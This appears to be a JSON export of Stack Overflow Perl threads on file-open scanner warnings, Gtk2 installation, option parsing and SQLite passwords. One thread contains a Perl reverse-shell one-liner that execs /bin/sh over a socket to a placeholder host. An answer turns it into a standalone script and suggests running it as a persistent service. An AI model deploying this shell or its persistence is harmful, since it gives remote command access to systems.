"https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1576865909, "post_id": 59429638, "comment_id": 105045334, "body": "I am using HCL appscan to scan my code and this is detected as a malicious/vulnerable code. The command succeeds and the file is getting written as expected."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1576868808, "post_id": 59429638, "comment_id": 105046263, "body": "My best guess is that this is an outdated check based on two-argument open which absolutely could lead to privilege escalation since input can cause it to run arbitrary processes rather than just open files. Calling open with a third argument makes this impossible, though there are still the concerns @ikegami mentions."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1576869662, "post_id": 59429638, "comment_id": 105046572, "body": "Ah, that &quot;<i>PrivilegeEscalation</i>&quot; is it -- writing to (changing) the file system is apparently an escalation of whatever the tool considers OK.  Can the tool be configured?  Is there anything unusual about permissions, on the file / partition / filesystem, for the group/user ... ?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1576869849, "post_id": 59429638, "comment_id": 105046643, "body": "Note for the edit: the one thing you absolutely need to have in that <code>die</code> is the <a href=\"https://perldoc.perl.org/perlvar.html#Error-Variables\" rel=\"nofollow noreferrer\"><code>$!</code> variable</a>, which tells you what the error actually is."}], "answers": [{"comments": [{"owner": {"reputation": 5193, "user_id": 5996587, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/d15f53deb1b5f2cab3534565c91c5394?s=128&d=identicon&r=PG&f=1", "display_name": "codec", "link": "https://stackoverflow.com/users/5996587/codec"}, "edited": false, "score": 0, "creation_date": 1576868174, "post_id": 59429984, "comment_id": 105046038, "body": "Updated the question. The variable is constructed in the same script. This is a single perl file and the type of vulnerability is PrivilegeEscalation so I think you are right. But I am not sure how to avoid that."}, {"owner": {"reputation": 5193, "user_id": 5996587, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/d15f53deb1b5f2cab3534565c91c5394?s=128&d=identicon&r=PG&f=1", "display_name": "codec", "link": "https://stackoverflow.com/users/5996587/codec"}, "edited": false, "score": 0, "creation_date": 1576868579, "post_id": 59429984, "comment_id": 105046177, "body": "hmm I tried changing to <code>open(my $fh, &#39;&gt;&#39;, \\&quot;&#47;tmp&#47;test.txt&quot;) or die &quot;Could not open report file&quot;</code> with fully qualified path of the file but still same error."}, {"owner": {"reputation": 5193, "user_id": 5996587, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/d15f53deb1b5f2cab3534565c91c5394?s=128&d=identicon&r=PG&f=1", "display_name": "codec", "link": "https://stackoverflow.com/users/5996587/codec"}, "edited": false, "score": 0, "creation_date": 1576868922, "post_id": 59429984, "comment_id": 105046300, "body": "I think it is not smart. <code>open(my $fh, &#39;&gt;&#39;, &quot;&#47;test.txt&quot;)</code> did not work as well !!"}, {"owner": {"reputation": 5193, "user_id": 5996587, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/d15f53deb1b5f2cab3534565c91c5394?s=128&d=identicon&r=PG&f=1", "display_name": "codec", "link": "https://stackoverflow.com/users/5996587/codec"}, "edited": false, "score": 0, "creation_date": 1576869052, "post_id": 59429984, "comment_id": 105046343, "body": "I was using a variable initially. That did not work either."}, {"owner": {"reputation": 5193, "user_id": 5996587, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/d15f53deb1b5f2cab3534565c91c5394?s=128&d=identicon&r=PG&f=1", "display_name": "codec", "link": "https://stackoverflow.com/users/5996587/codec"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1576869192, "post_id": 59429984, "comment_id": 105046403, "body": "Let us <a href=\"https://chat.stackoverflow.com/rooms/204626/discussion-between-codec-and-ikegami\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 4, "last_activity_date": 1576867849, "last_edit_date": 1576867849, "creation_date": 1576867336, "answer_id": 59429984, "question_id": 59429638, "link": "https://stackoverflow.com/questions/59429638/vulnerabilities-with-open-file/59429984#59429984", "title": "Vulnerabilities with open file", "body": "<p>That command can be used to replace or clobber any file to which the process's user has sufficient access, or to create a file in any directory to which the process's user has sufficient access. This has all kinds of ramifications.</p>\n\n<p>If the value of <code>$WlmScriptReportFile</code> is constructed in part or in whole from values outside of the control of the user as which program is running (potentially including the Current Work Directory), then the command could potentially be used maliciously.</p>\n"}], "owner": {"reputation": 5193, "user_id": 5996587, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/d15f53deb1b5f2cab3534565c91c5394?s=128&d=identicon&r=PG&f=1", "display_name": "codec", "link": "https://stackoverflow.com/users/5996587/codec"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 104, "favorite_count": 0, "accepted_answer_id": 59429984, "answer_count": 1, "score": 0, "last_activity_date": 1576868119, "creation_date": 1576865194, "last_edit_date": 1576868119, "question_id": 59429638, "link": "https://stackoverflow.com/questions/59429638/vulnerabilities-with-open-file", "title": "Vulnerabilities with open file", "body": "<p>I am using the following code to open a file and write in it.</p>\n\n<pre><code>my $WlmScriptReportFile = \"WlmScriptReport.out\";\nopen (my $fh, '&gt;',$WlmScriptReportFile) or die \"Could not open report file $WlmScriptReportFile\";\n</code></pre>\n\n<p>But this is detected as vulnerable(PrivilegeEscalation) as per the scanning tool I am using. I read some posts about this but this looks valid to me. Any pointer what is wrong in this?</p>\n"}, {"tags": ["perl", "gtk", "gtk3", "gtk2"], "comments": [{"owner": {"reputation": 624, "user_id": 10023107, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/9GLme.jpg?s=128&g=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/10023107/chris"}, "edited": false, "score": 3, "creation_date": 1576840152, "post_id": 59424120, "comment_id": 105034635, "body": "Welcome to SO. instead of posting a bad picture of your screen, you should post the error as text in your question, use backticks to show it as code. Moreover just tag your question with what you are using, or do you really use gtk + gtk2 + gtk3? Please also read <a href=\"https://stackoverflow.com/help/how-to-ask\">how to ask a good question on SO</a>"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 12570386, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mDflb2_0t11UEPO_fyoLUTBWGRmz_duiDX1QiGrMA=k-s128", "display_name": "deepak goswami", "link": "https://stackoverflow.com/users/12570386/deepak-goswami"}, "edited": false, "score": 0, "creation_date": 1577114441, "post_id": 59424293, "comment_id": 105096403, "body": "Perl-Gtk2 el7 package is not installable on RHEL 8.1"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 1, "user_id": 12570386, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mDflb2_0t11UEPO_fyoLUTBWGRmz_duiDX1QiGrMA=k-s128", "display_name": "deepak goswami", "link": "https://stackoverflow.com/users/12570386/deepak-goswami"}, "edited": false, "score": 0, "creation_date": 1577134021, "post_id": 59424293, "comment_id": 105103298, "body": "@deepakgoswami: Well, no, it wouldn&#39;t be, would it? But I don&#39;t know why you&#39;re trying to install the RHEL7 version on RHEL8. Your <code>yum</code> should be configured correctly to install RPMs from the correct package repository. If it&#39;s not, then you should take that up with the sysadmin."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 1, "last_activity_date": 1576840194, "creation_date": 1576840194, "answer_id": 59424293, "question_id": 59424120, "link": "https://stackoverflow.com/questions/59424120/perl-gtk2-error-unable-to-build-perl-gtk2-successfully/59424293#59424293", "title": "Perl-gtk2 error : unable to build perl-gtk2 successfully", "body": "<p>As shown by your image (and please don't post images of text - copy the actual text into your question) the error message talked about \"Gtk.pm\", not \"GTK.pm\". Attention to detail is very important for programmers :-)</p>\n\n<p>There's no need to build anything. The required module is already available in the standard RHEL package repositories.</p>\n\n<pre><code>$ sudo yum install perl-Gtk2\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 12570386, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mDflb2_0t11UEPO_fyoLUTBWGRmz_duiDX1QiGrMA=k-s128", "display_name": "deepak goswami", "link": "https://stackoverflow.com/users/12570386/deepak-goswami"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 267, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1577212115, "creation_date": 1576839606, "question_id": 59424120, "link": "https://stackoverflow.com/questions/59424120/perl-gtk2-error-unable-to-build-perl-gtk2-successfully", "title": "Perl-gtk2 error : unable to build perl-gtk2 successfully", "body": "<p><a href=\"https://i.stack.imgur.com/YX0xv.jpg\" rel=\"nofollow noreferrer\">enter image description here</a></p>\n\n<p>While building my code in getting error : can't locate GTK2.pm @INC (you may need to install gtk2 module) \nSo I tried to build perl-gtk2 source code on RHEL 8.1. I'm using perl 5.26 version. After building perl script Makefile.pl, I'm running MAKE and it's not getting build successfully. Some of the .pod files are not getting generated. </p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1576857566, "post_id": 59424010, "comment_id": 105042211, "body": "Re &quot;<i>without having to change the way the arguments are parsed.</i>&quot;, I&#39;m not sure what you mean by that. Without change, your script going to continue doing the same thing."}], "answers": [{"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 4, "last_activity_date": 1576839671, "creation_date": 1576839671, "answer_id": 59424138, "question_id": 59424010, "link": "https://stackoverflow.com/questions/59424010/perl-use-command-line-argument-multiple-times/59424138#59424138", "title": "perl - use command-line argument multiple times", "body": "<p>That's not your actual code, is it? It won't even compile.</p>\n\n<p>I'd be really surprised if <a href=\"https://metacpan.org/pod/Getopt::Long\" rel=\"nofollow noreferrer\">Getopt::Long</a> can't solve your problem and it's really a better idea to use a library rather than writing your own code.</p>\n\n<p>But changing your code to store <code>-var2</code> options in an array is simple enough.</p>\n\n<pre><code>my ($variable1, @variable2, $variable3);\n\nif ($arg eq \"-var1\") {\n    $variable1 = shift(@arguments)\n} elsif ($arg eq \"-var2\") {\n    push @variable2, shift(@arguments)\n} elsif ($arg eq \"-var3\") {\n    $variable3 = shift(@arguments)\n}\n</code></pre>\n\n<p>(I've also removed the <code>main::</code> from your variables and added the, presumably missing, <code>$</code>s. It's really unlikely that you want to be using package variables rather than lexical variables.)</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 3, "last_activity_date": 1576857710, "last_edit_date": 1576857710, "creation_date": 1576857340, "answer_id": 59428067, "question_id": 59424010, "link": "https://stackoverflow.com/questions/59424010/perl-use-command-line-argument-multiple-times/59428067#59428067", "title": "perl - use command-line argument multiple times", "body": "<p>This particular wheel <a href=\"https://metacpan.org/pod/Getopt::Long\" rel=\"nofollow noreferrer\">already exists</a>. Please don't try to reinvent it. That just makes it a pain for the people trying to use your script. There's no reason to force people to learn a whole new set of rules in order to execute your program.</p>\n\n<pre><code>use File::Basename qw( basename );\nuse Getopt::Long   qw( );\n\nmy $foo;\nmy @bars;\nmy $baz;\n\nsub help {\n   my $prog = basename($0);\n   print\n\"Usage:\n  $prog [options]\n  $prog --help\n\nOptions:\n  --foo foo\n      ...\n\n  --bar bar\n      May be used multiple times.\n      ...\n\n  --baz baz\n      ...\n\";\n   exit(0);\n}\n\n\nsub usage {\n   if (@_) {\n      my ($msg) = @_;\n      chomp($msg);\n      say STDERR $msg;\n   }\n\n   my $prog = basename($0);\n   say STDERR \"Try '$prog --help' for more information.\";\n   exit(1);\n}\n\n\nsub parse_args {\n   Getopt::Long::Configure(qw( posix_default ));\n   Getopt::Long::GetOptions(\n      \"help\"  =&gt; \\&amp;help,\n      \"foo=s\" =&gt; \\$foo,\n      \"bar=s\" =&gt; \\@bars,\n      \"baz=s\" =&gt; \\$baz,\n   )\n      or usage();\n\n   !@ARGV\n      or usage(\"Too many arguments\");\n\n   return @ARGV;\n}\n\n\nmain(parse_args());\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 1, "last_activity_date": 1576868373, "creation_date": 1576868373, "answer_id": 59430164, "question_id": 59424010, "link": "https://stackoverflow.com/questions/59424010/perl-use-command-line-argument-multiple-times/59430164#59430164", "title": "perl - use command-line argument multiple times", "body": "<p>Well, it is good practice to document your core -- you would appreciate it as soon as you return to make changes</p>\n\n<p>NOTE: in Linux it requires <strong>perl-doc</strong> package to be installed to use <strong>--man</strong> option in full extent</p>\n\n<pre><code>#!/usr/bin/perl\n#\n# Description:\n#   Describe purpose of the program\n#\n# Parameters:\n#   Describe parameters purpose\n#\n# Date: Tue Nov 29 1:18:00 UTC 2019\n#\n\nuse warnings;\nuse strict;\n\nuse Getopt::Long qw(GetOptions);\nuse Pod::Usage;\n\nmy %opt;\n\nGetOptions(\n        'input|i=s'     =&gt; \\$opt{input},\n        'output|o=s'    =&gt; \\$opt{output},\n        'debug|d'       =&gt; \\$opt{debug},\n        'help|?'        =&gt; \\$opt{help},\n        'man'           =&gt; \\$opt{man}\n) or pod2usage(2);\n\npod2usage(1) if $opt{help};\npod2usage(-exitval =&gt; 0, -verbose =&gt; 2) if $opt{man};\n\nprint Dumper(\\%opt) if $opt{debug};\n\n\n__END__\n\n=head1 NAME\n\nprogram - describe program's functionality \n\n=head1 SYNOPSIS\n\nprogram.pl [options]\n\n Options:\n    -i,--input  input filename\n    -o,--output output filename\n    -d,--debug  output debug information\n    -?,--help   brief help message\n       --man    full documentation\n\n=head1 OPTIONS\n\n=over 4\n\n=item B&lt;-i,--input&gt;\n\nInput filename\n\n=item B&lt;-o,--output&gt;\n\nOutput filename\n\n=item B&lt;-d,--debug&gt;\n\nPrint debug information.\n\n=item B&lt;-?,--help&gt;\n\nPrint a brief help message and exits.\n\n=item B&lt;--man&gt;\n\nPrints the manual page and exits.\n\n=back\n\nB&lt;This program&gt; accepts B&lt;several parameters&gt; and operates with B&lt;them&gt; to produce some B&lt;result&gt;\n\n=cut\n</code></pre>\n"}], "owner": {"reputation": 1773, "user_id": 1987607, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/e317b170bca0054580ef85f7a6469de6?s=128&d=identicon&r=PG&f=1", "display_name": "user1987607", "link": "https://stackoverflow.com/users/1987607/user1987607"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 168, "favorite_count": 0, "accepted_answer_id": 59424138, "answer_count": 3, "score": 1, "last_activity_date": 1576868373, "creation_date": 1576839068, "last_edit_date": 1576839759, "question_id": 59424010, "link": "https://stackoverflow.com/questions/59424010/perl-use-command-line-argument-multiple-times", "title": "perl - use command-line argument multiple times", "body": "<p>I'm modifying a perl script in which the command line arguments are parsed like this:</p>\n\n<pre><code>if ($arg eq \"-var1\") {\n    $main::variable1 = shift(@arguments)\n} elsif ($arg eq \"-var2\") {\n    $main::variable2 = shift(@arguments)\n} elsif ($arg eq \"var3\") {\n    $main::variable3 = shift(@arguments)\n} ... \n\n</code></pre>\n\n<p>So there is a whole bunch of elsif statements to cover all command-line arguments.</p>\n\n<p>I'm now in a situaton where I want to use the argument '-var2' multiple times. </p>\n\n<p>So my main::variable2 should maybe be an array that contains all values that are passed with \"-var2\". </p>\n\n<p>I found that with Perl::getopt, this can be easily achieved (<a href=\"https://stackoverflow.com/questions/25346520/perl-getopt-using-same-option-multiple-times\">Perl Getopt Using Same Option Multiple Times</a>). </p>\n\n<p>However the way that my script parses its command-line arguments is different. So I was wondering if it could be achieved, without having to change the way the arguments are parsed.</p>\n"}, {"tags": ["sql", "sqlite", "perl", "dbi"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1576798127, "post_id": 59417601, "comment_id": 105023547, "body": "From what I can tell, SQLite doesn&#39;t have built-in support for password/encryption. (It does provide hooks so custom builds of it can add support.)"}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1576800558, "post_id": 59417601, "comment_id": 105024098, "body": "After some quick searching around on metacpan, there doesn&#39;t seem to be a module that uses any of the encryption extensions for sqlite that are out there (Sqlcipher, <a href=\"https://www.hwaci.com/sw/sqlite/see.html\" rel=\"nofollow noreferrer\">SEE</a>, etc.)"}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1576801009, "post_id": 59417601, "comment_id": 105024184, "body": "There&#39;s a <a href=\"https://www3.sqlite.org/cgi/src/dir?name=ext/userauth\" rel=\"nofollow noreferrer\">userauth</a> module for non-encrypted databases using passwords, but you&#39;d have to make your own version of DBD::SQLite that incorporates it and I don&#39;t think it stops versions that don&#39;t use that extension from using the database."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1576858376, "post_id": 59417601, "comment_id": 105042536, "body": "DBD::SQLcipher can be used in place of DBD::SQLite via this <a href=\"https://metacpan.org/pod/release/SIMCOP/DBD-SQLcipher-0.03_0019/lib/DBD/SQLcipher.pm\" rel=\"nofollow noreferrer\">dev release</a>, which can be installed with <code>cpanm --dev DBD::SQLcipher</code> until it gets a working stable release."}], "answers": [{"tags": [], "owner": {"reputation": 5, "user_id": 11217975, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-3mvlnbugvhM/AAAAAAAAAAI/AAAAAAAAABg/7FdLM1GLD7c/photo.jpg?sz=128", "display_name": "themostanonymousanonymous", "link": "https://stackoverflow.com/users/11217975/themostanonymousanonymous"}, "is_accepted": true, "score": 0, "last_activity_date": 1585927532, "creation_date": 1585927532, "answer_id": 61015182, "question_id": 59417601, "link": "https://stackoverflow.com/questions/59417601/database-password-with-perl-dbi/61015182#61015182", "title": "Database Password with Perl DBI", "body": "<p>Because there is no implementation of databank encryption in perl and apparently different libraries have their own implementation (there does not seem to be a standard for that) the encryption has to be done via the library which will later decrypt the password. My solution was to write a script in Visual Studio which will acquire all data from a database (or just a database file) and stores it in a sql file which will then be encrypted with the desired password.</p>\n\n<p>So while there are some independet solutions for several libaries, there in no solution for perl DBI </p>\n"}], "owner": {"reputation": 5, "user_id": 11217975, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-3mvlnbugvhM/AAAAAAAAAAI/AAAAAAAAABg/7FdLM1GLD7c/photo.jpg?sz=128", "display_name": "themostanonymousanonymous", "link": "https://stackoverflow.com/users/11217975/themostanonymousanonymous"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 177, "favorite_count": 0, "accepted_answer_id": 61015182, "answer_count": 1, "score": 0, "last_activity_date": 1585927532, "creation_date": 1576794139, "last_edit_date": 1576794629, "question_id": 59417601, "link": "https://stackoverflow.com/questions/59417601/database-password-with-perl-dbi", "title": "Database Password with Perl DBI", "body": "<p>So I am creating a file on a server with Perl DBI. This file is created with: </p>\n\n<pre><code>my $dbFile = DBI-&gt;connect(\"DBI:SQLite:dbname=folder/databaseName.db\", \"\", \"desiredPassword\", optionArray);\n</code></pre>\n\n<p>My driver is obviously SQLite and the file extension is <code>.db</code>. Later on I want to use this file in Visual Studio with the following connection string (everything will be on a local file so NO data stream to any databank): </p>\n\n<pre><code>Data Source=myfile.sqlite;Password=desiredPassword;Version=3 \n</code></pre>\n\n<p>Basically all I do is to download the <code>.db</code> file from the server into a local SQLite file, but that works perfectly fine.</p>\n\n<p>My problem is that I have no idea how to set a password for the database I create with the connection string in the code example. I assumed that it should just be settable in the <code>DBI</code> connect function that creates the file. However this doesn't work at all. So how can I set a password for my <code>.db</code> file with Perl DBI?</p>\n"}, {"tags": ["linux", "perl", "sockets", "connection", "reverse"], "answers": [{"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 1, "last_activity_date": 1576773897, "creation_date": 1576773897, "answer_id": 59413833, "question_id": 59411530, "link": "https://stackoverflow.com/questions/59411530/how-can-i-create-persistent-socket-connection-on-perl/59413833#59413833", "title": "how can i create persistent socket connection on perl?", "body": "<p>Well, step one would be to take your command-line script and turn it into a real program. Put it in a file called <code>my_server</code> and reformat it like this (to make it easier to maintain).</p>\n\n<pre><code>use Socket;\n\n$i = \"**iphere**\";\n$p = **porthere**;\n\nsocket(S, PF_INET, SOCK_STREAM, getprotobyname(\"tcp\"));\n\nif (connect(S, sockaddr_in($p, inet_aton($i)))) {\n  open(STDIN, \"&gt;&amp;S\");\n  open(STDOUT, \"&gt;&amp;S\");\n  open(STDERR, \"&gt;&amp;S\");\n  exec(\"/bin/sh -i\");\n}\n</code></pre>\n\n<p>You can now run that by typing <code>perl my_server</code> at the command line. We can make it look more like a command by adding a shebang line and making it executable. At this point I'm also going to add Perl's safety nets, <code>use strict</code> and <code>use warnings</code> (which you should always have in your Perl code), and they will require us to define our variables with <code>my</code>.</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nuse Socket;\n\nmy $i = \"**iphere**\";\nmy $p = **porthere**;\n\nsocket(S, PF_INET, SOCK_STREAM, getprotobyname(\"tcp\"));\n\nif (connect(S, sockaddr_in($p, inet_aton($i)))) {\n  open(STDIN, \"&gt;&amp;S\");\n  open(STDOUT, \"&gt;&amp;S\");\n  open(STDERR, \"&gt;&amp;S\");\n  exec(\"/bin/sh -i\");\n}\n</code></pre>\n\n<p>If we now make that executable (<code>chmod +x my_server</code>), we can now run it by just typing the program's name (<code>my_server</code>) on the command line.</p>\n\n<p>The next step would be to make it into a proper service which you can start, stop and monitor using your OS's native service capabilities. I don't have time to get into that in detail, but I'd be looking at <a href=\"https://metacpan.org/release/Daemon-Control\" rel=\"nofollow noreferrer\">Daemon::Control</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 35, "user_id": 8019262, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ijQXTh_G084/AAAAAAAAAAI/AAAAAAAABOo/-sN2-L6xVmo/photo.jpg?sz=128", "display_name": "Jaiveer", "link": "https://stackoverflow.com/users/8019262/jaiveer"}, "is_accepted": false, "score": 1, "last_activity_date": 1576962528, "creation_date": 1576962528, "answer_id": 59439858, "question_id": 59411530, "link": "https://stackoverflow.com/questions/59411530/how-can-i-create-persistent-socket-connection-on-perl/59439858#59439858", "title": "how can i create persistent socket connection on perl?", "body": "<p>You're kinda using Old school, C like of socket programming in perl which is good but remember it's Perl.  To make it more readable and simple, you can always use <code>IO::Socket</code>.  Which improves code readability and reduces code complexity.  Also in production environment, I would recommend you to add server IP's in <code>/etc/hosts</code> and use the host name instead of IP.  </p>\n"}], "owner": {"reputation": 11, "user_id": 11249055, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-sPPAPLxAbUI/AAAAAAAAAAI/AAAAAAAAABU/6UFfoLcov14/photo.jpg?sz=128", "display_name": "NKMaze", "link": "https://stackoverflow.com/users/11249055/nkmaze"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 128, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1576962528, "creation_date": 1576764981, "last_edit_date": 1576794736, "question_id": 59411530, "link": "https://stackoverflow.com/questions/59411530/how-can-i-create-persistent-socket-connection-on-perl", "title": "how can i create persistent socket connection on perl?", "body": "<p>I'm learning Perl and I have two Linux systems (server/client). I want to connect them via Perl with a reverse socket connection.</p>\n\n<p>The way I do it is with this command on the server side:</p>\n\n<pre><code>perl -e 'use Socket;\n  $i=\"**iphere**\";\n  $p=**porthere**;\n  socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\n  if(connect(S,sockaddr_in($p,inet_aton($i)))){ \n    open(STDIN,\"&gt;&amp;S\");\n    open(STDOUT,\"&gt;&amp;S\");\n    open(STDERR,\"&gt;&amp;S\");\n    exec(\"/bin/sh -i\");\n  };'\n</code></pre>\n\n<p>This works fine, but I want to make it persistent on time. Maybe executing some delayed script.</p>\n\n<p>The server system is <em>CentOS</em>.</p>\n\n<p>Any idea?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 1, "creation_date": 1576763056, "post_id": 59410612, "comment_id": 105008990, "body": "What is this <code>ReadConf</code>? From looking at the code of <code>Config::Simple</code> the error happens if the syntax of the config file is not defined. In my opinion the error should be somewhere in <code>ReadConf</code> where it uses <code>Config::Simple</code>."}, {"owner": {"reputation": 11, "user_id": 12565269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa33c7dab6624b74da01c11902bbc59f?s=128&d=identicon&r=PG&f=1", "display_name": "Foxssg", "link": "https://stackoverflow.com/users/12565269/foxssg"}, "reply_to_user": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1576764701, "post_id": 59410612, "comment_id": 105009893, "body": "ReadConf is in the same folder that DatabaseSql.   -----Tree: -producer.pl -lib -config    in config there is one file: -sws_snmpcollector.cfg     In lib there are: -DatabaseSql.pm -ReadConf.pm -And some others modules."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1576772426, "post_id": 59410612, "comment_id": 105014185, "body": "Like Steffen said, we need to see <code>ReadConf</code>"}, {"owner": {"reputation": 1934, "user_id": 10667839, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9ee13d3681ace95a1c13693db607f72?s=128&d=identicon&r=PG&f=1", "display_name": "clamp", "link": "https://stackoverflow.com/users/10667839/clamp"}, "edited": false, "score": 0, "creation_date": 1576779517, "post_id": 59410612, 